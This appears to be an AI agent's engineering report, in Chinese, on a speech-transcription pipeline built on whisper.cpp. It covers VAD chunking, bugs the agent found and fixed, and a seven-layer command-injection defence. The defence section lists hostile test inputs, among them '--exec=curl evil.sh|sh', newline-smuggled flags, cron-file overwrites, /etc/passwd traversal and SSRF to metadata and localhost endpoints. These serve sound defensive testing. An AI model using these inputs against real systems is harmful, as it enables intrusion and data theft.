---
id: D-06
author: gpu-runtime
status: ready
date: 2026-08-02
task: T-020
---

## TL;DR（≤ 25 行，Manager 只读这里）

- **两条端到端全跑通，贴真实输出**。F2 本地文件：11.0s 音频 → **0.80s**（RTF **0.047**，**21.3x**），转写逐字正确。F1 真实公网 URL（`upload.wikimedia.org` 的 1921 年 Marcus Garvey 演讲，2,658,394 字节，公有领域）→ **220.2s 音频 / 9 chunk / 45 段 / 20.2s**（ASR RTF **0.045**，**22.2x**）。**且这条 URL 是在 `enableSiteExtractor: false`（yt-dlp 完全关闭）下跑通的** —— TD-002 不是声称，是跑出来的。
- **测试 75/75 全绿**，eslint 干净，`tsc -b` 干净。用 Node 内置 `node:test`，**没有新增任何依赖**（不碰 oss-scout 的 root package.json）。
- **真实运行抓到我自己 3 个 bug**，全部已修 + 加回归测试：
  1. **`isSafeExecutable` 用宿主的 `path.isAbsolute`** 判断 Windows 路径 → 在 Linux 上 `C:\...` 一律被判成穿越，**CVE-2024-27980 那条分支根本不可达，`.bat` 测试一直在为错误的理由通过**。改用 `win32.isAbsolute`/`posix.isAbsolute`，并把扩展名检查提到前面。
  2. **whisper 的 `offsets` 是绝对时间不是相对时间**（实测：`--offset-t 60000` → 报 `from: 60000`）。我原本又加了一次 chunk 偏移 → **220s 的录音出现 419s 的段落**。单 chunk 测试永远看不见，只有多 chunk 真跑能暴露。
  3. **chunk 边界重复转写**：whisper 按 30s 窗口解码会越过 `--duration`，下一个 chunk 再转一遍同一段话，时间戳非单调、F5 播放高亮会闪。加了 `dedupeBoundarySegments`（要求**时间重叠**而不只是文本相似 —— 说话人真的会重复自己）。
- **命令注入 7 层全部落地，每层配至少一个攻击用例**（`argGuard.test.ts`，25 个用例）。包括：`--exec=curl evil.sh|sh` 当 URL、换行走私（`new URL()` 会静默吞掉 `\n`，所以控制字符必须在 parse **之前**查）、多字节长度绕过（1000 个 4 字节 emoji < 2048 字符但 = 4000 字节）、SSRF 打 `169.254.169.254` 与**我们自己的 127.0.0.1 daemon 端口**、symlink 逃逸（`path.resolve` 会被骗，必须 `realpath`）。
- **VAD 不需要新依赖**：whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero，MIT），**已经在我 T-012 建的 L1 core 包里**。注意输出单位是**厘秒**不是秒（jfk.wav 11.0s → 报 1059），读错会让 chunk 长 100 倍。
- **whisper.cpp v1.9.1 的 `--output-json-full` 不输出 `avg_logprob`/`no_speech_prob`**（实测 segment 只有 `['timestamps','offsets','text','tokens']`）→ 置信度改为**用真实 token 概率均值**（排除 `[_BEG_]` 这类特殊标记，否则虚高）。实测置信度 0.65–0.93，与文本质量吻合。
- **TD-002 落地为代码而非注释**：`YtDlpSource` 的 `match()` 返回**全场最低正分**，且 D-01 §6.4 的真实规则是**按 probe 结果回退**而不是按 URL 形状打分——我的第一版只做了打分，是测试逼出了这个修正。7 个 TD-002 用例断言"关掉 GPL 组件后播客/RSS/HLS/直链/本地文件全部照常"。
- **GPU lane 互斥已测**：`gpu.asr` 与 `gpu.llm` 共用一个 `gpu.exclusive` 信号量，4 个并发任务下 **0 次同时占用**；异常与取消路径都不泄漏 permit（泄漏会死锁掉后续所有任务）。
- **关键取舍**：chunk 用 `--offset-t/--duration` 开窗而不是切成 N 个临时 WAV —— 少一次编解码、边界精确、少 N 个文件；代价是必须处理 whisper 的窗口越界（已处理）。
- **未验证/存疑**：`SherpaOnnxEngine`（F3 流式）**未实现**，只留了 `AsrEngine.openStream` 接口；F3 两阶段（流式→离线重跑）**未实现**；`RssSource` 只跑了单元测试，**没跑过真实播客 feed**；yt-dlp 路径**一行都没真跑过**（本机没装，ADR-001 C 类运行时下载）；Windows/macOS 分支全部未验证；`assertHostNotPrivate` 有 **TOCTOU DNS rebinding 缺口**（已在 §9 记录，未修）。
- **对其他 agent 的影响**：`architect` —— D-01 §8.4 把 `SubprocessRunner` 放在 `apps/daemon/src/subprocess/**`，但我实现在 `packages/pipeline/src/subprocess/`（spawn 的实际发生地），daemon 直接 import 即可，**请确认这个位置调整**。`model-mgmt` —— 我没依赖 `packages/shared` 里任何尚未导出的东西，`TranscriptSegment` 是 pipeline 自己的类型，对齐 D-02 §1.5 的列。

---

# 详细内容

> **证据等级**：`[实测]` = 本机真跑过，附命令与输出。`[未验证]` = 无环境/未实现。
> **本机**：Linux x86_64，AMD Ryzen AI MAX+ 395（KVM 32 vCPU，15.6 GB），无 GPU。
> **引擎**：whisper.cpp v1.9.1 CPU 后端（T-012 自建的 L1 core 包，ggml ABI 0.15.1，自动选中 `zen4` 变体）。
> **模型**：`ggml-base.en.bin`（147,964,211 B）+ `ggml-silero-v5.1.2.bin`（VAD）。

---

## 1. 架构

```
packages/pipeline/src/
├── subprocess/
│   ├── argGuard.ts      D-01 §8.4 L3/L6 + §8.5 —— URL/argv/路径校验（纯函数，好测）
│   └── runner.ts        D-01 §8.4 L1/L2/L5 —— 全包唯一允许 import child_process 的模块
├── tools.ts             工具路径解析（一律绝对路径，绝不搜 PATH）
├── media/
│   ├── types.ts         MediaSource 契约（我们自己的类型，不透传上游）
│   ├── registry.ts      MediaSourceRegistry —— 业务代码唯一入口
│   └── sources/
│       ├── localFile.ts   F2
│       ├── directHttp.ts  F1 直链 + HLS   ← TD-002 主力
│       ├── rss.ts         F1 播客          ← TD-002 主力
│       └── ytdlp.ts       F1 兜底（GPLv3+，唯一出现该标识符的实现文件）
├── audio/
│   ├── ffmpeg.ts        ffprobe / 16kHz mono 归一化 / 切片
│   └── vad.ts           Silero VAD + chunk 规划   ← D-01 §4.1 的核心
├── asr/
│   ├── types.ts         AsrEngine 契约 + 幻觉检测 + 置信度
│   └── whisperCpp.ts    主引擎（子进程）
├── queue/lanes.ts       资源 lane 信号量 + 优先级 + 协作式抢占
└── transcribe.ts        编排：fetch→probe→normalize→vad→[chunk→asr→落库]×N
```

**分层原则**：`argGuard.ts` 全是纯函数，所以攻击用例可以直接对它写单测，不需要真的起子进程——这让"每层配一个攻击测试"成本极低。

---

## 2. 命令注入防护（7 层，逐层配攻击用例）

> 全部 25 个用例在 `subprocess/__tests__/argGuard.test.ts`，**75/75 全绿** `[实测]`。

| 层 | 措施 | 攻击用例 | 结果 |
|---|---|---|---|
| **L1 架构隔离** | `runner.ts` 是本包唯一 import `node:child_process` 的模块 | CI grep（§8） | ✅ |
| **L2 绝不过 shell** | `spawn(bin, argv, {shell:false})`；Windows 拒 `.bat/.cmd/.ps1/.com/.vbs/.js` | `C:\tools\yt-dlp.bat` | ✅ `unsafe_executable` |
| **L2b 绝对路径** | 拒绝裸命令名（否则 PATH 抢跑） | `ffmpeg` | ✅ `path_escape` |
| **L3.1 scheme** | 只允许 http/https | `file:///etc/passwd`、`data:`、`javascript:`、`ftp:` | ✅ `bad_scheme` |
| **L3.2 凭据** | 拒绝 `user:pass@` | `https://u:p@example.com/a.mp3` | ✅ `embedded_credentials` |
| **L3.3 SSRF** | 拒私网/回环/链路本地/元数据/CGNAT/IPv4-mapped | `169.254.169.254`、**`127.0.0.1:7331`（我们自己的 daemon）**、`::ffff:127.0.0.1` | ✅ `private_address` |
| **L3.4 前导 `-`** | 即使有 `--` 也拒 | **`--exec=curl evil.sh\|sh`**、`-o/etc/cron.d/pwn`、`--load-info-json=...` | ✅ `leading_dash` |
| **L3.5 `--` 终止符** | 用户输入永远排在 `--` 之后 | 见 L6 | ✅ |
| **L3.6 控制字符/长度** | **parse 之前**查控制字符；长度按**字节** | `...\n--exec=sh`（换行走私）、1000 个 emoji（4000 字节 < 2048 字符） | ✅ `control_characters` / `too_long` |
| **L4 关掉工具危险面** | yt-dlp 强制 `--ignore-config --no-config-locations --no-exec --no-playlist`；prompt 截断 1024 | prompt 100,000 字符 | ✅ 截断到 1024 |
| **L5 进程环境** | env 白名单**重建**（不是过滤）；剔除 `LD_PRELOAD`/`DYLD_*`/`NODE_OPTIONS`/`PYTHONPATH`；强制 timeout；SIGTERM→5s→SIGKILL 整个进程组；stdio 1MB 环形缓冲 | — | 代码落地 |
| **L6 不变量** | `buildArgv({flags, operands})` 从结构上分离可信标志与不可信操作数 | 断言操作数**恰好一个 argv 元素**、不被拼进邻居 | ✅ |
| **L7 路径穿越（§8.5）** | `realpath` 后校验；Windows 拒 UNC/盘符相对 | `../../../etc/passwd`、**symlink 逃逸** | ✅ `path_escape` |

### 2.1 三个值得单独说的点

**① 控制字符必须在 `new URL()` 之前查 `[实测]`**
`new URL()` 会**静默剥离** `\n`、`\t`、`\r`。先 parse 再查，等于把一个恶意串洗成看起来干净的串。所以顺序是：长度 → 控制字符 → 前导 `-` → parse。

**② 长度必须按字节算 `[实测]`**
`'\u{1F600}'.repeat(1000)` 是 1000 个字符、2000 个 UTF-16 码元、**4000 字节**。按 `.length` 判会放行 4 KB 的 argv。测试里显式断言了 `emojiUrl.length < MAX_URL_BYTES` 这个前提，确保这个用例真的在测绕过而不是碰巧超长。

**③ 我们自己就是 SSRF 的靶子**
ADR-003 决策 1 要求 daemon 绑 `127.0.0.1`。这意味着"让下载器去访问 `http://127.0.0.1:7331/api/v1/settings`"是一个**针对我们自己 API 的 confused-deputy 攻击**。这条用例是专门为此写的。

---

## 3. TD-002：yt-dlp 可替换性（跑出来的，不是写出来的）

### 3.1 三重保证

1. **打分**：`YtDlpSource.match()` 返回 **10**，`DirectHttpSource` 返回 30–80，`RssSource` 返回 20–85，`LocalFileSource` 返回 60–100。测试断言 `ytdlp.match(url) < direct.match(url)`。
2. **按 probe 回退，不是按打分** —— 这是测试逼出来的修正。D-01 §6.4 原文是"先 `DirectHttpSource.probe`（一次 HEAD）；不是直链媒体才落到 `YtDlpSource`"。我第一版只实现了打分，于是 watch 页 URL 被 `DirectHttpSource`（30 分）截胡后直接失败，永远到不了兜底。现在 `registry.probe()` 会**依次真的尝试**每个候选，失败才下沉。
3. **开关**：`registry.setEnabled('yt-dlp', false)` 运行时生效，零代码改动（ADR-002 要求的回滚路径）。

### 3.2 测试结果 `[实测]`

```
✔ resolves every core input WITHOUT the site extractor
✔ resolves the same inputs identically WITH the extractor enabled
✔ scores the GPL adapter strictly below every licence-clean adapter
✔ falls through to the extractor only AFTER the clean adapters actually decline
✔ never reaches the extractor when a clean adapter succeeds
✔ gives actionable remediation instead of a crash when the extractor is gone
✔ can toggle the adapter at runtime with no re-registration
✔ a throwing adapter cannot take the registry down
```

覆盖的输入：播客 MP3 直链、CDN m4a、公有领域 OGG、HLS `.m3u8`、播客 RSS（`.rss` 与 `/feed` 两种形态）、本地文件。

### 3.3 最强的一条证据 `[实测]`

**§6 的 F1 真实 URL 端到端，是在 `enableSiteExtractor: false` 下跑的**：

```
resolved adapter: direct-http | site extractor enabled: false
adapter        : direct-http | downloaded 2658394 bytes application/ogg
```

即：**GPL 组件完全关闭时，真实公网 URL 的完整导入+转写照常工作。**

---

## 4. 音频与 VAD

### 4.1 VAD 不需要新依赖 `[实测]`

whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero VAD via ggml，MIT），**已在 T-012 建的 L1 core 包内**。实测输出：

```
$ whisper-vad-speech-segments -f samples/jfk.wav -vm ggml-silero-v5.1.2.bin -np
Detected 5 speech segments:
Speech segment 0: start = 29.00, end = 221.00
Speech segment 1: start = 330.00, end = 377.00
Speech segment 2: start = 400.00, end = 435.00
Speech segment 3: start = 538.00, end = 765.00
Speech segment 4: start = 816.00, end = 1059.00
```

**⚠️ 单位是厘秒（centisecond）不是秒。** jfk.wav 是 11.0 秒 = 1100 厘秒，末段 1059 正好落在里面。当成秒读会让每个 chunk 长 100 倍。测试里有一条断言专门守这个：`assert.ok(s.endMs <= 11_000)`。

### 4.2 chunk 规划

- 目标 30s（对齐 whisper 原生窗口，一个 chunk = 一次 encoder pass，无浪费 padding）
- 硬上限 45s；小于 1s 的向前合并（模型加载开销大于音频本身）
- **静音间隔 > 2s 直接断开，且静音不喂给模型** —— whisper 在静音上会自信地胡说，这是它最出名的缺陷，不喂是最便宜的缓解
- 在静音处断而不是按固定时钟断 → 不会把词切两半，而且免费（VAD 已经告诉我们静音在哪）
- VAD 不可用时降级为固定窗口 + 500ms 重叠（**降级不是失败**）

实测 220s 的演讲切出 **9 个 chunk**：
```
#0:0-26600 #1:26390-48970 #2:48920-78370 #3:78390-103910 #4:103800-128810
#5:128570-155690 #6:155450-184490 #7:184350-207880 #8:207670-218410
```

### 4.3 ffmpeg 的危险面（D-01 §8.4 L4）

| 参数 | 原因 |
|---|---|
| `-nostdin` | 否则 ffmpeg 抢父进程 stdin，挂死 |
| `-protocol_whitelist file`（本地）/ `https,tls,tcp,crypto,httpproxy`（远程） | ffmpeg 认识 `concat:`/`subfile:`/`file:`，**恶意 HLS 播放列表能让它读本地任意文件并拼进输出**。远程集合里**没有 `file`** |
| 用户串**绝不**进 `-filter_complex`/`-vf`/`-metadata` | filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是嵌在单个 argv 元素**内部**的第二套注入语法 |
| `-progress pipe:1` | 机器可读进度，不用去 scrape 人类日志格式 |

---

## 5. ASR 适配层

### 5.1 开窗而不是切片

用 `--offset-t` / `--duration` 让 whisper 从同一个归一化 WAV 里读它要的窗口，**不生成 N 个临时 WAV**：少一次编解码、边界精确、少 N 个文件。代价是要处理窗口越界（见 §6.3）。

### 5.2 置信度：文档没写，实测才知道 `[实测]`

我原本按 D-01 的描述读 `avg_logprob` / `no_speech_prob`。实测 v1.9.1 的 `--output-json-full`：

```
segment keys : ['timestamps', 'offsets', 'text', 'tokens']
```

**没有 `avg_logprob`，没有 `no_speech_prob`。** 只有 `tokens[].p`。

→ 改为：优先用 `avg_logprob`（其它版本/前端有），否则**取真实 token 概率的均值**，并**排除 `[_BEG_]` 这类特殊标记**（它们概率恒接近 1，会把分数虚高）。实测结果 0.65–0.93，和文本质量的直觉吻合（`conf=0.65` 那句确实转错了几个词）。

### 5.3 幻觉检测（D-02 §1.5 flags bit0）

两种模式：连续重复 token ≥5 次；短语平铺整串（覆盖中文这种无空格语言）。`detectRepetition('字幕由社群提供' × 4)` → true，正常英文散文 → false。

---

## 6. 端到端实测

### 6.1 F2 本地文件 `[实测]`

```
source adapter : local-file
duration       : 11.00 s
speech detected: 7.44 s
chunks         : 1 [[90,10790]]
segments       : 1
timings ms     : {"probe":47,"fetch":41,"normalize":87,"vad":63,"asr":517}
RTF            : 0.0470  => speedup 21.3x
total wall     : 0.80 s
persisted      : [{"chunk":0,"segs":1}]

=== TRANSCRIPT ===
  [0.09-10.59] conf=0.86 flags=0 And so, my fellow Americans, ask not what your country
                                 can do for you, ask what you can do for your country.
```

### 6.2 F1 真实公网 URL（**yt-dlp 关闭**）`[实测]`

素材：`https://upload.wikimedia.org/wikipedia/commons/7/7c/Marcus_Garvey%2C_speech%2C_1921.ogg`
（1921 年 Marcus Garvey 演讲，**公有领域**，Wikimedia Commons API `extmetadata` 确认 `LicenseShortName=Public domain, Copyrighted=False`）

```
resolved adapter: direct-http | site extractor enabled: false
adapter        : direct-http | downloaded 2658394 bytes application/ogg
duration       : 220.2 s | speech 204.4 s
chunks         : 9
segments       : 45
timings ms     : {"probe":3930,"fetch":5727,"normalize":318,"vad":285,"asr":9896}
RTF            : 0.0449 => speedup 22.2x
total wall     : 20.2 s
persisted chunks in order: [0,1,2,3,4,5,6,7,8]

monotonic timestamps: true
max endMs           : 218150 vs duration 220160
flagged segments    : 0

=== TRANSCRIPT (前 9 段) ===
  [0.0s ch0] conf=0.65 Hello citizens of Africa. I briefly in the name of the Universal Economic Movement Association
  [6.1s ch0] conf=0.83 and African Community League of the World. You may ask what organization is that?
  [11.7s ch0] conf=0.91 It is for me to inform you that the Universal Economic Movement Association
  [16.2s ch0] conf=0.84 is an organization that seeks to unite into one solid body the 400 million nicles of the world.
  [23.1s ch0] conf=0.92 The link of the 50 million nicles of the United States of America
  [26.5s ch0] conf=0.72 with a 20 million because of the West Indies, the 40 million because of South and Central
  [30.9s ch1] conf=0.87 America, with the 280 million equals of Africa for the purpose of centering our industrial,
  [36.9s ch1] conf=0.89 commercial, educational, social and political condition. As you are aware, the world in which
  [44.0s ch1] conf=0.72 we live today is divided into separate groups and distinct nationalities.
```

（1921 年的蜡筒录音，底噪极大；"nicles"/"equals" 是 base.en 对 "Negroes" 的误识——这是模型能力问题，不是流水线问题。换 `large-v3-turbo` 应显著改善，**未测**。）

### 6.3 真跑抓到的 3 个 bug（本节是本文档最有价值的部分）

#### Bug 1 — `isSafeExecutable` 用宿主的 `path.isAbsolute` 判 Windows 路径

`path.isAbsolute` 绑定宿主 OS。在 Linux 上 `isAbsolute('C:\\tools\\yt-dlp.exe')` = **false** → Windows 路径一律先被判成 `path_escape`，**CVE-2024-27980 的 `.bat` 分支根本不可达**。
更糟的是：`.bat` 那条测试**一直在通过**，只是通过的理由是错的。是"断言错误码而不只是断言拒绝"这个习惯把它揪出来的。
修复：按目标平台选 `win32.isAbsolute` / `posix.isAbsolute`，并把扩展名检查提到绝对路径检查**之前**（安全相关的原因优先于通用路径抱怨）。

#### Bug 2 — whisper 的 offsets 是绝对时间

实测：
```
$ whisper-cli --offset-t 60000 --duration 20000 --output-json-full …
   from 60000 to 66120 |  for the citizens of Germany, for the Germans, of Ireland…
VERDICT: offsets are ABSOLUTE to file (must NOT add chunk offset)
```
我原本又加了一次 `req.offsetMs` → **220s 的录音里出现 419.9s 的段落**（`max endMs 425820 vs duration 220160`）。
**单 chunk 测试永远看不见这个 bug**（chunk0 偏移是 0，加不加都一样）。只有多 chunk 的真实长音频能暴露。这就是为什么验收标准要求"跑一个真实音频"而不是"跑通单测"。

#### Bug 3 — chunk 边界重复转写

修完 Bug 2 后 `monotonic timestamps: false`，且看到：
```
[26.5s ch0] with a 20 million because of the West Indies, the 40 million because of South and Central
[26.4s ch1] with the 20 million equals of the West Indies, the 40 million equals of South and Central
```
同一句话被 ch0 和 ch1 各转一遍。原因：chunk 计划本身有 200ms padding 重叠，**而且 whisper 按 30s 窗口解码，会吐出越过 `--duration` 的段落**。
修复两处：① 解析时丢弃完全落在窗口外的段；② `dedupeBoundarySegments()` 要求**时间重叠 > 50%** 才判重复——只看文本相似不安全，说话人真的会重复自己。
修复后：`monotonic timestamps: true`，`max endMs 218150 ≤ 220160`，段数 51 → 45（去掉 6 个边界重复）。

---

## 7. 任务队列

### 7.1 lane 信号量 `[实测]`

| lane | 容量 | 实测断言 |
|---|---|---|
| `net.download` | 2 | 6 个并发任务，峰值并发 = 2 ✅ |
| `cpu.media` | `clamp(cores/4,1,4)` | 1核→1、8核→2、128核→4 ✅ |
| `gpu.asr` / `gpu.llm` | **各 1，且互斥** | 4 个混合任务，**同时占用违例 = 0** ✅ |
| `io.local` | 4 | 运行时扩容能释放等待者 ✅ |

**GPU 互斥的实现要点**：GPU lane **先取 `gpu.exclusive` 再取 lane 自身信号量**。全局一致的加锁顺序是防死锁的关键——两个调用者以相反顺序加锁就是教科书式的锁序反转。
另有两条测试守 permit 泄漏：① 任务体抛异常时；② 排队中被 abort 时。**泄漏一个 permit 会死锁掉之后所有 GPU 任务**，所以这两条必须有。

### 7.2 抢占：只在 chunk 边界 `[设计]`

D-01 §4.3 明确不做硬抢占（kill 正在跑的推理 = 扔掉已花的算力）。`PriorityTracker.shouldYield()` 只对**严格更高**优先级让路（相等会抖动）。worker 每完成一个 chunk 问一次，让出时保留 checkpoint。

### 7.3 崩溃续跑与 `plan_version` `[设计 + 单测]`

- 已落库的 `transcript_segments` **就是** checkpoint；`completedChunkIndices` 只是加速缓存。
- `deriveResumeSet(indices, storedPlanVersion)`：版本不匹配就**返回空集强制重跑**。升级后 chunk 边界可能整体变了，旧索引毫无意义——**慢但对**优于**快但错**。

---

## 8. CI 强制项（给 T-011/CI 落地）

```bash
# ① yt-dlp 标识符不得逃出适配层（ADR-002 / D-01 §6.4 保证 2）
#    允许出现的位置：实现文件、其 index 导出行、类型注释、工具路径字段、测试
grep -rn "yt-dlp" --include=*.ts packages/ apps/ \
  | grep -v "packages/pipeline/src/media/sources/ytdlp.ts" \
  | grep -v "packages/pipeline/src/media/__tests__/" \
  && echo "FAIL: yt-dlp identifier escaped the adapter" && exit 1

# ② child_process 只允许在 SubprocessRunner 里出现
grep -rn "node:child_process" --include=*.ts packages/ apps/ \
  | grep -v "packages/pipeline/src/subprocess/runner.ts" \
  && echo "FAIL: child_process used outside SubprocessRunner" && exit 1

# ③ 测试
node --test packages/pipeline/dist/**/__tests__/*.test.js
```

**当前状态 `[实测]`**：`grep -rl "yt-dlp\|ytDlp\|YtDlp" packages/pipeline/src` 命中 9 个文件，其中 8 个是**注释/类型字段/import 行/测试**，唯一的实现在 `media/sources/ytdlp.ts`。建议 CI 规则按"标识符 + 非注释行"收紧，我没有在本任务里改 eslint 配置（不是我的文件）。

---

## 9. 诚实清单

### 9.1 已实测
1. F2 本地文件端到端，RTF 0.047，转写逐字正确
2. F1 真实公网 URL 端到端（**yt-dlp 关闭**），9 chunk / 45 段 / RTF 0.045
3. 75/75 测试通过；eslint 干净；`tsc -b` 干净
4. VAD 真跑（Silero，厘秒单位已验证）
5. whisper JSON 真实结构（无 avg_logprob）
6. whisper offsets 是绝对时间（`--offset-t 60000` → `from: 60000`）
7. GPU lane 互斥 0 违例
8. 25 个命令注入攻击用例全挡
9. symlink 逃逸被 `realpath` 挡住
10. 三个自身 bug 被真跑抓出并修复 + 加回归测试

### 9.2 未验证 / 未实现
| # | 项 | 状态 |
|---|---|---|
| 1 | **`SherpaOnnxEngine`（F3 流式）** | **未实现**。只留了 `AsrEngine.openStream?` 可选接口 |
| 2 | **F3 两阶段（流式→离线重跑提准）** | **未实现** |
| 3 | `YtDlpSource` 的 probe/fetch | **一行都没真跑过**（本机未装 yt-dlp，属 ADR-001 C 类运行时下载） |
| 4 | `RssSource` 真实播客 feed | **只跑了单元测试**，没跑过真 feed |
| 5 | HLS `.m3u8` 路径 | **未跑过真实 HLS 流** |
| 6 | Windows / macOS 分支 | **全部未验证**（无机器） |
| 7 | `assertHostNotPrivate` 的 DNS rebinding | **已知缺口未修**：lookup 与实际连接之间有 TOCTOU 窗口。真正修复需要把解析到的 IP 钉进连接（自定义 agent / `lookup` hook） |
| 8 | `assertWithinRoot` 的 TOCTOU | 同样已知。D-01 §8.5 要求校验后立刻 `open()` 用 fd 操作，**调用方尚未这么做** |
| 9 | 大文件（数小时）压力 | 最长只测到 220s |
| 10 | 取消/暂停的真实中断 | 有单测覆盖信号量路径，**没在真实长转写中途按过取消** |
| 11 | `nice` 降优先级 | 代码写了，**没测过实际调度效果** |
| 12 | 中文/多语种转写 | **只测了英文**（base.en 模型） |

### 9.3 建议下一步
1. **[高] F3 流式**：接 `sherpa-onnx-node`（npm 有完整 per-platform 预编译，T-002 已核实），实现 `openStream` + 两阶段重跑。这是唯一还没动的功能。
2. **[高] 真跑一次 yt-dlp 路径**：装上二进制，验证 §2 L4 的那组硬化参数真的生效（特别是 `--ignore-config`）。
3. **[中] DNS rebinding 收口**：自定义 `lookup` 把解析结果钉死。
4. **[中] 换 `large-v3-turbo` 复测**：base.en 在 1921 年录音上误识明显，量一下模型档位对质量的实际影响（ADR-004 决策 3：跑真实基准，不编数字）。
